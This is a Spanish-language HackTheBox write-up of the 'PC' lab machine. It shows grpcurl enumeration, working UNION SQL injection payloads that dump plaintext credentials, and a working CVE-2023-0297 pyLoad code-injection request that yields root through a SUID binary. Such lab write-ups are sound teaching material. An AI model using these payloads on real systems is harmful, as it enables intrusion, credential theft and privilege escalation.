@@ -1,0 +1,327 @@
+---
+title: "Máquina PC"
+categoriess: ['HackTheBox', 'Easy', 'Linux']
+description: "Resolución de la máquina PC de HackTheBox"
+tags: ['gRPC', 'SQLi', 'CVE-2023-0297']
+logo: '/assets/writeups/pc/logo.png'
+---
+
+Un simple servidor gRPC con un método vulnerable a SQL Injection nos permitirá obtener una contraseña en texto claro para acceder por SSH al sistema. Escalaremos privilegios abusando del CVE-2023-0297 de pyLoad
+
+## Reconocimiento
+
+La máquina solamente tiene dos puertos abiertos
+
+```bash
+# Nmap 7.94 scan initiated Thu Oct  5 18:20:56 2023 as: nmap -sS -Pn -n -vvv -p- --open --min-rate 200 -oN ports 10.10.11.214
+Nmap scan report for 10.10.11.214
+Host is up, received user-set (0.17s latency).
+Scanned at 2023-10-05 18:04:14 -04 for 900s
+Not shown: 65533 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE REASON
+22/tcp    open  ssh     syn-ack ttl 63
+50051/tcp open  unknown syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 899.50 seconds
+           Raw packets sent: 197163 (8.675MB) | Rcvd: 740 (32.560KB)
+# Nmap done at Thu Oct  5 18:20:57 2023 -- 1 IP address (1 host up) scanned in 200.23 seconds
+```
+
+El `50051` no parece ser HTTP ni nada por el estilo, ya que con cualquier dato solo nos responde con unos signos de interrogación, pero buscando en internet por el puerto encontramos información de que parece ser que esto es [gRPC](https://es.wikipedia.org/wiki/GRPC)
+
+![Google search](/assets/writeups/pc/1.png)
+
+Utilizando una herramienta llamada [grpcurl](https://github.com/fullstorydev/grpcurl), nos podemos comunicar con el servicio y en efecto, es gRPC
+
+```bash
+❯ grpcurl -vv -plaintext 10.10.11.214:50051 list
+SimpleApp
+grpc.reflection.v1alpha.ServerReflection
+```
+
+> Recomendado leer el help del programa antes de comenzar a usarlo
+{: .prompt-tip }
+
+Listando las funciones del servicio `SimpleApp`, podemos ver que parece ser un simple aplicativo con autenticación
+
+```bash
+❯ grpcurl -vv -plaintext 10.10.11.214:50051 describe SimpleApp
+SimpleApp is a service:
+service SimpleApp {
+  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
+  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
+}
+```
+
+Podemos acceder a ellas sin ninguna restricción, por lo que podemos autenticarnos
+
+```bash
+❯ grpcurl -v -plaintext -d '{"username":"testing","password":"testing123"}' 10.10.11.214:50051 SimpleApp.RegisterUser
+
+Resolved method descriptor:
+rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
+
+Request metadata to send:
+(empty)
+
+Response headers received:
+content-type: application/grpc
+grpc-accept-encoding: identity, deflate, gzip
+
+Response contents:
+{
+  "message": "Account created for user testing!"
+}
+
+Response trailers received:
+(empty)
+Sent 1 request and received 1 response
+❯ grpcurl -v -plaintext -d '{"username":"testing","password":"testing123"}' 10.10.11.214:50051 SimpleApp.LoginUser
+
+Resolved method descriptor:
+rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+
+Request metadata to send:
+(empty)
+
+Response headers received:
+content-type: application/grpc
+grpc-accept-encoding: identity, deflate, gzip
+
+Response contents:
+{
+  "message": "Your id is 219."
+}
+
+Response trailers received:
+token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGluZyIsImV4cCI6MTY5NjU1NDk0OH0.GWAbdFF2vjMc6xf5qSE-pt_myEbclrxd-mpbvOvbwEA'
+Sent 1 request and received 1 response
+```
+
+Si vemos bien, en la respuesta del Login hemos recibido un token, al parecer vamos a tener que usarlo como header para acceder a la función `SimpleApp.getInfo`, sin embargo esta función solo nos muestra un error:
+
+```bash
+❯ grpcurl -plaintext -H 'Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGluZyIsImV4cCI6MTY5NjU2NjUwOH0.nXOFW_82d5vK-tX3I0xSq9R5-KlS24WrTX84Uz5B8uc' -d '' 10.10.11.214:50051 SimpleApp.getInfo
+ERROR:
+  Code: Unknown
+  Message: Unexpected <class 'TypeError'>: bad argument type for built-in operation
+```
+
+Viendo la definición del objeto `getInfoRequest` que vimos en la lista de métodos del servicio, podemos ver que tenemos que enviar
+
+```bash
+❯ grpcurl -vv -plaintext 10.10.11.214:50051 describe getInfoRequest
+getInfoRequest is a message:
+message getInfoRequest {
+  string id = 1;
+}
+```
+
+Enviado eso en formato JSON, nos da una respuesta:
+
+```bash
+❯ grpcurl -plaintext -H 'Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGluZyIsImV4cCI6MTY5NjU2NjUwOH0.nXOFW_82d5vK-tX3I0xSq9R5-KlS24WrTX84Uz5B8uc' -d '{"id":"1"}' 10.10.11.214:50051 SimpleApp.getInfo
+{
+  "message": "The admin is working hard to fix the issues."
+}
+```
+
+Veamos que hacemos...
+
+## Intrusión
+
+Probando a poner cosas raras en el método getInfo, nos devuelve el error que vimos al principio en la enumeración; pero probando intentar abusar de una SQL Injection hace que la respuesta cambie
+
+```bash
+grpcurl -plaintext -H 'Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGluZyIsImV4cCI6MTY5NjU2NjUwOH0.nXOFW_82d5vK-tX3I0xSq9R5-KlS24WrTX84Uz5B8uc' -d "{\"id\":\"1 OR 1=1 -- -\"}" 10.10.11.214:50051 SimpleApp.getInfo
+{
+  "message": "The admin is working hard to fix the issues."
+}
+```
+> Se ve que el admin está trabajando duro
+{: .prompt-info }
+
+Si intentamos utilizar `UNION` para cambiar la respuesta, ¡funciona!
+
+```bash
+❯ grpcurl -plaintext -H 'Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGluZyIsImV4cCI6MTY5NjU2NjUwOH0.nXOFW_82d5vK-tX3I0xSq9R5-KlS24WrTX84Uz5B8uc' -d "{\"id\":\"4 UNION SELECT 'pwned' -- -\"}" 10.10.11.214:50051 SimpleApp.getInfo
+{
+  "message": "pwned"
+}
+```
+
+Probando por funciones típicas de MySQL/MariaDB/PostgreSQL no parece funcionar, por lo que podemos creer que estamos ante un gRPC que utiliza una base de datos H2/SQLite para manejar los datos; asi que vamos a usar intuición para obtener las tablas que nos interesen.
+
+Hemos visto que hay un método de registro y autenticación, ¿habrá más usuarios que se hayan registrado? eso tenlo por seguro; asi que vamos a ver. Intentando adivinar la tabla que almacena los usuarios nos toparemos con que se llama "accounts"
+
+```bash
+❯ grpcurl -plaintext -H 'Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGluZyIsImV4cCI6MTY5NjU2NjUwOH0.nXOFW_82d5vK-tX3I0xSq9R5-KlS24WrTX84Uz5B8uc' -d "{\"id\":\"4 UNION SELECT 'pwned' FROM accounts -- -\"}" 10.10.11.214:50051 SimpleApp.getInfo
+{
+  "message": "pwned"
+}
+```
+
+Los nombres de las columnas probablemente sean `username` y `password`, o uno de sus sinonimos/abreviaciones; probando por lo previamente dicho acertamos:
+
+```bash
+grpcurl -plaintext -H 'Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGluZyIsImV4cCI6MTY5NjU2NjUwOH0.nXOFW_82d5vK-tX3I0xSq9R5-KlS24WrTX84Uz5B8uc' -d "{\"id\":\"4 UNION SELECT username || ':' || password FROM accounts -- -\"}" 10.10.11.214:50051 SimpleApp.getInfo
+{
+  "message": "admin:admin"
+}
+```
+
+Indagando por cosas más interesantes respecto a usuarios, encontramos esto:
+
+```bash
+❯ grpcurl -plaintext -H 'Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdGluZyIsImV4cCI6MTY5NjU2NjUwOH0.nXOFW_82d5vK-tX3I0xSq9R5-KlS24WrTX84Uz5B8uc' -d "{\"id\":\"4 UNION SELECT username || ':' || password FROM accounts LIMIT 1,1 -- -\"}" 10.10.11.214:50051 SimpleApp.getInfo
+{
+  "message": "sau:HereIsYourPassWord1431"
+}
+```
+
+Estas credenciales son válidas para acceder por SSH, y en el directorio personal de esta persona podremos ver la primera flag.
+
+```bash
+❯ /usr/bin/ssh sau@10.10.11.214
+sau@10.10.11.214s password: 
+Last login: Thu Oct  5 14:48:28 2023 from 10.10.14.91
+sau@pc:~$ ls -la
+total 1244
+drwxr-xr-x 5 sau  sau     4096 Oct  5 14:09 .
+drwxr-xr-x 3 root root    4096 Jan 11  2023 ..
+lrwxrwxrwx 1 root root       9 Jan 11  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 sau  sau      220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 sau  sau     3771 Feb 25  2020 .bashrc
+drwx------ 2 sau  sau     4096 Jan 11  2023 .cache
+drwx------ 3 sau  sau     4096 Oct  5 14:43 .gnupg
+-rw-r--r-- 1 sau  sau      807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root root       9 Jan 11  2023 .viminfo -> /dev/null
+drwx------ 3 sau  sau     4096 Oct  5 14:08 snap
+-rw-r----- 1 root sau       33 Oct  5 06:35 user.txt
+sau@pc:~$ cat user.txt
+560e81c8ec871200928f250bda******
+```
+
+## Escalada de privilegios
+
+Hay un puerto interno en la máquina
+
+```bash
+sau@pc:~$ ss -ltu
+Netid         State          Recv-Q         Send-Q                 Local Address:Port                     Peer Address:Port         Process         
+udp           UNCONN         0              0                      127.0.0.53%lo:domain                        0.0.0.0:*                            
+udp           UNCONN         0              0                            0.0.0.0:bootpc                        0.0.0.0:*                            
+tcp           LISTEN         0              128                          0.0.0.0:9666                          0.0.0.0:*                            
+tcp           LISTEN         0              4096                   127.0.0.53%lo:domain                        0.0.0.0:*                            
+tcp           LISTEN         0              128                          0.0.0.0:ssh                           0.0.0.0:*                            
+tcp           LISTEN         0              5                          127.0.0.1:8000                          0.0.0.0:*                            
+tcp           LISTEN         0              4096                               *:50051                               *:*                            
+tcp           LISTEN         0              128                             [::]:ssh                              [::]:*                            
+```
+
+Si le hacemos un curl, nos responderá con esto:
+
+```bash
+sau@pc:~$ curl -v http://127.0.0.1:8000
+... [snip]
+< HTTP/1.1 302 FOUND
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 275
+< Location: /login?next=http%3A%2F%2F127.0.0.1%3A8000%2F
+< Vary: Accept-Encoding
+< Date: Fri, 06 Oct 2023 02:08:38 GMT
+< Server: Cheroot/8.6.0
+< 
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F</a>. If not, click the link.
+* Connection #0 to host 127.0.0.1 left intact
+```
+
+Es un servicio HTTP, si seguimos el redirect y analizamos el HTML podremos ver que se trata de un `pyLoad`, un servidor para manejar por web descargas de todo tipo.
+
+Buscando por vulnerabilidades encontramos una inyección de código catalogada como CVE-2023-0297, no conocemos la versión que posee esta máquina para considerarse vulnerable por lo que nos quedará intentar. Buscando por PoCs encontramos que debemos enviarle algo como `jk=pyimport%20os;os.system("$commandhere");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa` a la ruta `/flash/addcrypted2` del servidor por POST.
+
+Haciendo y probando a poner por un comando que cree un archivo en `/tmp/`, funciona
+
+```bash
+sau@pc:/tmp$ curl --data-raw 'jk=pyimport%20os;os.system("touch /tmp/testing");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' -s http://127.0.0.1:8000/flash/addcrypted2
+Could not decrypt keysau@pc:/tmp$ ls -l
+total 29
+drwxr-xr-x 4 root root 4096 Oct  6 17:47 pyLoad
+drwx------ 3 root root 4096 Oct  6 17:47 snap-private-tmp
+drwx------ 3 root root 4096 Oct  6 17:47 systemd-private-40c6775e4d8847de99531d2e1818a66f-ModemManager.service-Ojh48h
+drwx------ 3 root root 4096 Oct  6 17:47 systemd-private-40c6775e4d8847de99531d2e1818a66f-systemd-logind.service-FjLt1e
+drwx------ 3 root root 4096 Oct  6 17:47 systemd-private-40c6775e4d8847de99531d2e1818a66f-systemd-resolved.service-AmAHui
+-rw-r--r-- 1 root root    0 Oct  6 20:01 testing
+drwx------ 2 root root 4096 Oct  6 17:47 tmpoetrzazv
+drwx------ 2 root root 4096 Oct  6 17:47 vmware-root_729-4257135007
+```
+
+El propietario del archivo es root, por lo que ya sabiendo que ese es el usuario que corre el servicio simplemente podemos crearnos un copia SUID de un binario y convertirnos en root. Vamos a colocarlo en un script ya que estamos limitados de carácteres en la inyección de código.
+
+```bash
+sau@pc:/tmp$ cat test.sh
+#!/bin/bash
+
+cp /usr/sbin/capsh /tmp/nan && chmod u+s /tmp/nan
+sau@pc:/tmp$ chmod +x test.sh # No olvides darle permisos de ejecución
+sau@pc:/tmp$ curl -d 'jk=pyimport%20os;os.system("bash /tmp/test.sh");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' -s http://127.0.0.1:8000/flash/addcrypted2
+sau@pc:/tmp$ ./nan --gid=0 --uid=0 --
+root@pc:/tmp# rm nan
+```
+
+Ya podemos tomar la última flag.
+
+```bash
+root@pc:/root# ls -al
+total 68
+drwx------  7 root root  4096 Apr 27 15:32 .
+drwxr-xr-x 21 root root  4096 Apr 27 15:23 ..
+lrwxrwxrwx  1 root root     9 Jan 11  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
+drwxr-xr-x  3 root root  4096 Apr  4  2023 .cache
+drwxr-xr-x  3 root root  4096 Apr  4  2023 .local
+-rw-r--r--  1 root root   161 Dec  5  2019 .profile
+drwxr-xr-x  7 root root  4096 Jan 11  2023 .pyload
+-rw-------  1 root root  3203 Apr 27 15:32 .viminfo
+drwxr-xr-x  3 root root  4096 Apr 27 13:15 Downloads
+-rw-r-----  1 root root    33 Oct  6 17:47 root.txt
+drwx------  3 root root  4096 Jan 11  2023 snap
+-rw-r--r--  1 root root 24576 Jan 11  2023 sqlite.db.bak
+root@pc:/root# cat root.txt
+20c3070a7044458d11344774d0******
+```
+
+## Extra
+
+Otra forma sencilla de haber identificado el servicio en el puerto extraño pudo haber sido enviando una petición HTTP/2 con cURL, ya que gRPC funciona en base de HTTP/2
+
+```bash
+❯ curl --http2-prior-knowledge -v http://10.10.11.214:50051
+*   Trying 10.10.11.214:50051...
+* Connected to 10.10.11.214 (10.10.11.214) port 50051
+* [HTTP/2] [1] OPENED stream for http://10.10.11.214:50051/
+* [HTTP/2] [1] [:method: GET]
+* [HTTP/2] [1] [:scheme: http]
+* [HTTP/2] [1] [:authority: 10.10.11.214:50051]
+* [HTTP/2] [1] [:path: /]
+* [HTTP/2] [1] [user-agent: curl/8.3.0]
+* [HTTP/2] [1] [accept: */*]
+> GET / HTTP/2
+> Host: 10.10.11.214:50051
+> User-Agent: curl/8.3.0
+> Accept: */*
+> 
+< HTTP/2 200 
+< content-type: application/grpc
+< grpc-status: 2
+< grpc-message: Bad method header
+< 
+* Connection #0 to host 10.10.11.214 left intact
+```
